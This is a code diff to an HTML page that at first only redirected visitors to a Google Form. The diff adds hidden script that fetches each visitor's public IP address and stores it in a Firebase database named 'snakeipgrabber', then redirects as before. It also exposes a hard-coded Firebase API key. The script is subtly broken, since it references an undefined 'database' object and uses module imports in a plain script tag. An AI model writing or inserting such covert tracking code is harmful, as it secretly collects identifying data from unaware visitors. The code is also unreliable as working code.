@@ -1,7 +1,25 @@
 <html>
     <head>
         <script>
-            window.location.href = "https://forms.gle/mtHw1FPQLsUFNGzU8";
+            
+            import { initializeApp } from "firebase/app";
+            import { getDatabase } from "firebase/database";
+            const ref = database.ref("ips");
+            const firebaseConfig = {
+                apiKey: "AIzaSyDWHnonHwA0sT6xdJCL09Xfq1ZcEo7ikK4",
+                authDomain: "snakeipgrabber.firebaseapp.com",
+                projectId: "snakeipgrabber",
+                databaseURL: "https://snakeipgrabber.firebaseio.com",
+                storageBucket: "snakeipgrabber.appspot.com"
+            };
+            function addIp(userip) {
+                ref.push(userip);
+            }
+            const app = initializeApp(firebaseConfig);
+            fetch("https://api.ipify.org/?format=json")
+            .then(results => results.json())
+            .then(addIp)    
+            window.location.href = "https://forms.gle/mtHw1FPQLsUFNGzU8";      
         </script>
     </head>
 </html>
